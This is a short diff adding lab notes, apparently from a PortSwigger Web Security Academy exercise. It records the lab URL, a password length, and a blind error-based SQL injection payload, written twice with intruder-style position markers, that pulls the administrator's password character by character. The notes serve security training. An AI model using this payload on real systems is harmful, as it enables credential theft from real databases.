@@ -1,0 +1,8 @@
+URL:https://0a1600c20311873782d697ad00a800dd.web-security-academy.net
+Passsword size:20
+SQLi:'||(SELECT CASE WHEN SUBSTR(password,$a$,1)$a$'$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+
+'||(SELECT CASE WHEN SUBSTR(password,$a$,1)$a$'$a$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Password_Lenght_injection:asasdfasd--$a$
